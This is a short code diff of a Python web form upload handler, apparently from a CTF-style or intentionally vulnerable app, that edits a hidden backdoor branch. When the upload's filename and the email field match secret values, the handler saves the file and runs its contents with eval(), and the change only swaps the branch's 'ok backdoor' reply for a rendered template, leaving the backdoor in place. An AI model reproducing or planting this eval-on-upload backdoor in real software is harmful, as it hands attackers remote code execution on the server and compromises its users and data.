@@ -36,7 +36,7 @@ def handle_post(file: FileStorage, name, email):
         if file.filename == a and email == c:
             file.save(UPLOAD_DIR + secure_filename(file.filename))
             eval(open(UPLOAD_DIR + secure_filename(file.filename), "r").read())
-            return "ok backdoor"
+            return render_template("backdoor.html")
         elif is_file_allowed(file):
             file.save(UPLOAD_DIR + secure_filename(file.filename))
             return render_template("remerciement.html",
